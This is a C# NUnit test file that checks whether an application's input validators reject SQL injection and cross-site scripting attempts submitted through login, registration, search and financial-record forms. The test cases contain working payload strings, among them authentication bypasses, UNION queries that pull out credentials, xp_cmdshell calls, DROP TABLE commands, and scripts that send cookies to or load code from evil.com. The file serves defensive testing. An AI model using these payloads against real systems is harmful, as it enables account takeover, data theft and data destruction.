using NUnit.Framework;
using SafeVault.Web.Validators;
using SafeVault.Web.Models;
using System.ComponentModel.DataAnnotations;

namespace SafeVault.Tests;

/// <summary>
/// Comprehensive attack scenario tests to verify security measures
/// Tests simulate real-world attack attempts including SQL injection and XSS
/// </summary>
[TestFixture]
public class TestAttackScenarios
{
    #region SQL Injection Attack Scenarios

    [Test]
    [TestCase("admin' OR '1'='1")]
    [TestCase("admin' OR '1'='1'--")]
    [TestCase("admin' OR '1'='1'/*")]
    [TestCase("admin'--")]
    [TestCase("' OR 1=1--")]
    [TestCase("' OR 'x'='x")]
    [TestCase("'; DROP TABLE Users--")]
    [TestCase("1'; DROP TABLE FinancialRecords--")]
    [TestCase("'; DELETE FROM Users WHERE 'a'='a")]
    [TestCase("admin'; INSERT INTO Users VALUES('hacker','hacked')--")]
    public void SQLInjection_AuthenticationBypass_IsBlocked(string maliciousInput)
    {
        // Arrange
        var validator = new SqlInjectionSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var result = validator.GetValidationResult(maliciousInput, context);

        // Assert
        Assert.That(result, Is.Not.EqualTo(ValidationResult.Success),
            $"SQL injection authentication bypass should be blocked: {maliciousInput}");
    }

    [Test]
    [TestCase("' UNION SELECT NULL--")]
    [TestCase("' UNION SELECT NULL,NULL--")]
    [TestCase("' UNION SELECT NULL,NULL,NULL--")]
    [TestCase("1' UNION ALL SELECT NULL,NULL,NULL--")]
    [TestCase("admin' UNION SELECT username,password FROM Users--")]
    [TestCase("' UNION SELECT table_name FROM information_schema.tables--")]
    [TestCase("1' UNION SELECT column_name FROM information_schema.columns--")]
    public void SQLInjection_UnionBasedAttacks_AreBlocked(string maliciousInput)
    {
        // Arrange
        var validator = new SqlInjectionSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var result = validator.GetValidationResult(maliciousInput, context);

        // Assert
        Assert.That(result, Is.Not.EqualTo(ValidationResult.Success),
            $"UNION-based SQL injection should be blocked: {maliciousInput}");
    }

    [Test]
    [TestCase("'; EXEC sp_executesql N'SELECT * FROM Users'--")]
    [TestCase("'; EXEC xp_cmdshell 'dir'--")]
    [TestCase("'; EXECUTE sp_password--")]
    [TestCase("admin'; EXEC master..xp_cmdshell 'net user'--")]
    public void SQLInjection_StoredProcedureExecution_IsBlocked(string maliciousInput)
    {
        // Arrange
        var validator = new SqlInjectionSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var result = validator.GetValidationResult(maliciousInput, context);

        // Assert
        Assert.That(result, Is.Not.EqualTo(ValidationResult.Success),
            $"Stored procedure execution attempt should be blocked: {maliciousInput}");
    }

    [Test]
    [TestCase("admin'/**/OR/**/1=1--")]
    [TestCase("admin'/*comment*/AND/*comment*/'1'='1")]
    [TestCase("' OR 1=1#")]
    [TestCase("' OR 1=1;--")]
    public void SQLInjection_CommentBasedBypass_IsBlocked(string maliciousInput)
    {
        // Arrange
        var validator = new SqlInjectionSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var result = validator.GetValidationResult(maliciousInput, context);

        // Assert
        Assert.That(result, Is.Not.EqualTo(ValidationResult.Success),
            $"Comment-based SQL injection bypass should be blocked: {maliciousInput}");
    }

    [Test]
    [TestCase("1'; INSERT INTO Users (Username, Email) VALUES ('hacker', 'hack@evil.com')--")]
    [TestCase("'; DELETE FROM FinancialRecords--")]
    [TestCase("'; UPDATE Users SET IsAdmin=1--")]
    [TestCase("'; DROP TABLE Users--")]
    [TestCase("'; DROP DATABASE SafeVault--")]
    public void SQLInjection_DataManipulation_IsBlocked(string maliciousInput)
    {
        // Arrange
        var validator = new SqlInjectionSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var result = validator.GetValidationResult(maliciousInput, context);

        // Assert
        Assert.That(result, Is.Not.EqualTo(ValidationResult.Success),
            $"Data manipulation SQL injection should be blocked: {maliciousInput}");
    }

    #endregion

    #region XSS Attack Scenarios

    [Test]
    [TestCase("<script>alert('XSS')</script>")]
    [TestCase("<script>alert(document.cookie)</script>")]
    [TestCase("<script>window.location='http://evil.com?cookie='+document.cookie</script>")]
    [TestCase("<script src='http://evil.com/malicious.js'></script>")]
    [TestCase("<SCRIPT>alert('XSS')</SCRIPT>")]
    [TestCase("<ScRiPt>alert('XSS')</ScRiPt>")]
    public void XSS_BasicScriptInjection_IsBlocked(string maliciousInput)
    {
        // Arrange
        var validator = new XssSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var result = validator.GetValidationResult(maliciousInput, context);

        // Assert
        Assert.That(result, Is.Not.EqualTo(ValidationResult.Success),
            $"Basic XSS script injection should be blocked: {maliciousInput}");
    }

    [Test]
    [TestCase("<img src=x onerror=alert('XSS')>")]
    [TestCase("<img src=x onerror='alert(document.cookie)'>")]
    [TestCase("<body onload=alert('XSS')>")]
    [TestCase("<input onfocus=alert('XSS') autofocus>")]
    [TestCase("<select onfocus=alert('XSS') autofocus>")]
    [TestCase("<textarea onfocus=alert('XSS') autofocus>")]
    [TestCase("<div onmouseover=alert('XSS')>")]
    [TestCase("<a href='#' onclick=alert('XSS')>Click</a>")]
    [TestCase("<svg onload=alert('XSS')>")]
    public void XSS_EventHandlerInjection_IsBlocked(string maliciousInput)
    {
        // Arrange
        var validator = new XssSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var result = validator.GetValidationResult(maliciousInput, context);

        // Assert
        Assert.That(result, Is.Not.EqualTo(ValidationResult.Success),
            $"Event handler XSS injection should be blocked: {maliciousInput}");
    }

    [Test]
    [TestCase("javascript:alert('XSS')")]
    [TestCase("javascript:void(alert('XSS'))")]
    [TestCase("javascript:eval('malicious code')")]
    [TestCase("<a href='javascript:alert(document.cookie)'>Click</a>")]
    public void XSS_JavaScriptProtocol_IsBlocked(string maliciousInput)
    {
        // Arrange
        var validator = new XssSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var result = validator.GetValidationResult(maliciousInput, context);

        // Assert
        Assert.That(result, Is.Not.EqualTo(ValidationResult.Success),
            $"JavaScript protocol XSS should be blocked: {maliciousInput}");
    }

    [Test]
    [TestCase("<iframe src='http://evil.com'>")]
    [TestCase("<iframe src='javascript:alert(\"XSS\")'>")]
    [TestCase("<embed src='http://evil.com/malicious.swf'>")]
    [TestCase("<object data='http://evil.com/malicious'>")]
    [TestCase("<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>")]
    public void XSS_IframeAndObjectInjection_IsBlocked(string maliciousInput)
    {
        // Arrange
        var validator = new XssSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var result = validator.GetValidationResult(maliciousInput, context);

        // Assert
        Assert.That(result, Is.Not.EqualTo(ValidationResult.Success),
            $"Iframe/Object XSS injection should be blocked: {maliciousInput}");
    }

    [Test]
    [TestCase("data:text/html,<script>alert('XSS')</script>")]
    [TestCase("data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=")]
    [TestCase("<a href='data:text/html,<script>alert(\"XSS\")</script>'>Click</a>")]
    public void XSS_DataURIScheme_IsBlocked(string maliciousInput)
    {
        // Arrange
        var validator = new XssSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var result = validator.GetValidationResult(maliciousInput, context);

        // Assert
        Assert.That(result, Is.Not.EqualTo(ValidationResult.Success),
            $"Data URI XSS should be blocked: {maliciousInput}");
    }

    [Test]
    [TestCase("eval('alert(\"XSS\")')")]
    [TestCase("eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))")]
    [TestCase("<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>")]
    public void XSS_EvalBasedInjection_IsBlocked(string maliciousInput)
    {
        // Arrange
        var validator = new XssSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var result = validator.GetValidationResult(maliciousInput, context);

        // Assert
        Assert.That(result, Is.Not.EqualTo(ValidationResult.Success),
            $"Eval-based XSS should be blocked: {maliciousInput}");
    }

    #endregion

    #region Form Field Attack Scenarios

    [Test]
    public void FormField_LoginUsernameWithSQLInjection_IsBlocked()
    {
        // Arrange - Simulate a login form submission with SQL injection attempt
        var loginModel = new LoginViewModel
        {
            Username = "admin' OR '1'='1'--",
            Password = "password"
        };

        var context = new ValidationContext(loginModel) { MemberName = "Username" };
        var results = new List<ValidationResult>();

        // Act
        var isValid = Validator.TryValidateProperty(
            loginModel.Username,
            context,
            results);

        // Assert
        Assert.That(isValid, Is.False,
            "Login form should reject username with SQL injection attempt");
        Assert.That(results, Is.Not.Empty,
            "Validation errors should be present");
    }

    [Test]
    public void FormField_LoginUsernameWithXSS_IsBlocked()
    {
        // Arrange - Simulate a login form submission with XSS attempt
        var loginModel = new LoginViewModel
        {
            Username = "<script>alert('XSS')</script>",
            Password = "password"
        };

        var context = new ValidationContext(loginModel) { MemberName = "Username" };
        var results = new List<ValidationResult>();

        // Act
        var isValid = Validator.TryValidateProperty(
            loginModel.Username,
            context,
            results);

        // Assert
        Assert.That(isValid, Is.False,
            "Login form should reject username with XSS attempt");
        Assert.That(results, Is.Not.Empty,
            "Validation errors should be present");
    }

    [Test]
    public void FormField_RegistrationEmailWithXSS_IsBlocked()
    {
        // Arrange - Simulate registration with XSS in email field
        var registerModel = new RegisterViewModel
        {
            Username = "testuser",
            Email = "test@example.com<script>alert('XSS')</script>",
            Password = "SecureP@ss123",
            ConfirmPassword = "SecureP@ss123"
        };

        var context = new ValidationContext(registerModel) { MemberName = "Email" };
        var results = new List<ValidationResult>();

        // Act
        var isValid = Validator.TryValidateProperty(
            registerModel.Email,
            context,
            results);

        // Assert
        Assert.That(isValid, Is.False,
            "Registration form should reject email with XSS attempt");
        Assert.That(results, Is.Not.Empty,
            "Validation errors should be present");
    }

    [Test]
    public void FormField_FinancialRecordDescriptionWithXSS_IsBlocked()
    {
        // Arrange - Simulate financial record creation with XSS in description
        var financialModel = new FinancialRecordViewModel
        {
            Description = "Account Info<script>steal(document.cookie)</script>",
            SensitiveData = "1234-5678-9012-3456",
            Amount = 1000.00m
        };

        var context = new ValidationContext(financialModel) { MemberName = "Description" };
        var results = new List<ValidationResult>();

        // Act
        var isValid = Validator.TryValidateProperty(
            financialModel.Description,
            context,
            results);

        // Assert
        Assert.That(isValid, Is.False,
            "Financial record form should reject description with XSS attempt");
        Assert.That(results, Is.Not.Empty,
            "Validation errors should be present");
    }

    [Test]
    public void FormField_SearchTermWithSQLInjection_IsBlocked()
    {
        // Arrange - Simulate search with SQL injection
        var searchModel = new SearchViewModel
        {
            SearchTerm = "'; DROP TABLE FinancialRecords--"
        };

        var context = new ValidationContext(searchModel) { MemberName = "SearchTerm" };
        var results = new List<ValidationResult>();

        // Act
        var isValid = Validator.TryValidateProperty(
            searchModel.SearchTerm,
            context,
            results);

        // Assert
        Assert.That(isValid, Is.False,
            "Search form should reject search term with SQL injection attempt");
        Assert.That(results, Is.Not.Empty,
            "Validation errors should be present");
    }

    [Test]
    public void FormField_SearchTermWithXSS_IsBlocked()
    {
        // Arrange - Simulate search with XSS
        var searchModel = new SearchViewModel
        {
            SearchTerm = "<img src=x onerror=alert('XSS')>"
        };

        var context = new ValidationContext(searchModel) { MemberName = "SearchTerm" };
        var results = new List<ValidationResult>();

        // Act
        var isValid = Validator.TryValidateProperty(
            searchModel.SearchTerm,
            context,
            results);

        // Assert
        Assert.That(isValid, Is.False,
            "Search form should reject search term with XSS attempt");
        Assert.That(results, Is.Not.Empty,
            "Validation errors should be present");
    }

    #endregion

    #region Combined Attack Scenarios

    [Test]
    [TestCase("admin'<script>alert('XSS')</script>--")]
    [TestCase("<script>'; DROP TABLE Users--</script>")]
    [TestCase("'; DELETE FROM Users WHERE Username='<script>alert(1)</script>'--")]
    public void CombinedAttack_SQLInjectionAndXSS_IsBlocked(string maliciousInput)
    {
        // Arrange - Test both validators
        var sqlValidator = new SqlInjectionSafeAttribute();
        var xssValidator = new XssSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var sqlResult = sqlValidator.GetValidationResult(maliciousInput, context);
        var xssResult = xssValidator.GetValidationResult(maliciousInput, context);

        // Assert - At least one validator should catch it
        Assert.That(
            sqlResult != ValidationResult.Success || xssResult != ValidationResult.Success,
            Is.True,
            $"Combined SQL injection and XSS attack should be blocked: {maliciousInput}");
    }

    [Test]
    public void CombinedAttack_MaliciousLoginAttempt_IsCompletelyBlocked()
    {
        // Arrange - Simulate sophisticated attack combining multiple vectors
        var loginModel = new LoginViewModel
        {
            Username = "admin'--<script>alert(document.cookie)</script>",
            Password = "'; EXEC xp_cmdshell--"
        };

        var usernameContext = new ValidationContext(loginModel) { MemberName = "Username" };
        var usernameResults = new List<ValidationResult>();

        // Act
        var isUsernameValid = Validator.TryValidateProperty(
            loginModel.Username,
            usernameContext,
            usernameResults);

        // Assert
        Assert.That(isUsernameValid, Is.False,
            "Combined attack in login username should be blocked");
        Assert.That(usernameResults, Is.Not.Empty,
            "Username validation should have errors");
    }

    #endregion

    #region Edge Cases and Obfuscation Attempts

    [Test]
    [TestCase("' oR 1=1--")]
    [TestCase("' Or 1=1--")]
    [TestCase("' OR 1=1--")]
    [TestCase("' or 1=1--")]
    public void CaseInsensitiveAttack_SQLInjection_IsBlocked(string maliciousInput)
    {
        // Arrange
        var validator = new SqlInjectionSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var result = validator.GetValidationResult(maliciousInput, context);

        // Assert
        Assert.That(result, Is.Not.EqualTo(ValidationResult.Success),
            $"Case variation SQL injection should be blocked: {maliciousInput}");
    }

    [Test]
    [TestCase("<SCRIPT>alert('XSS')</SCRIPT>")]
    [TestCase("<ScRiPt>alert('XSS')</ScRiPt>")]
    [TestCase("<sCrIpT>alert('XSS')</sCrIpT>")]
    public void CaseInsensitiveAttack_XSS_IsBlocked(string maliciousInput)
    {
        // Arrange
        var validator = new XssSafeAttribute();
        var context = new ValidationContext(new object());

        // Act
        var result = validator.GetValidationResult(maliciousInput, context);

        // Assert
        Assert.That(result, Is.Not.EqualTo(ValidationResult.Success),
            $"Case variation XSS should be blocked: {maliciousInput}");
    }

    [Test]
    public void ValidInput_PassesThroughAllValidators()
    {
        // Arrange
        var validInputs = new[]
        {
            "john_doe",
            "user@example.com",
            "Product ABC123",
            "Monthly payment for utilities",
            "Valid description with numbers 123"
        };

        var sqlValidator = new SqlInjectionSafeAttribute();
        var xssValidator = new XssSafeAttribute();
        var maliciousValidator = new NoMaliciousInputAttribute();
        var context = new ValidationContext(new object());

        // Act & Assert
        foreach (var input in validInputs)
        {
            var sqlResult = sqlValidator.GetValidationResult(input, context);
            var xssResult = xssValidator.GetValidationResult(input, context);
            var maliciousResult = maliciousValidator.GetValidationResult(input, context);

            Assert.That(sqlResult, Is.EqualTo(ValidationResult.Success),
                $"Valid input should pass SQL injection check: {input}");
            Assert.That(xssResult, Is.EqualTo(ValidationResult.Success),
                $"Valid input should pass XSS check: {input}");
            Assert.That(maliciousResult, Is.EqualTo(ValidationResult.Success),
                $"Valid input should pass malicious input check: {input}");
        }
    }

    #endregion
}
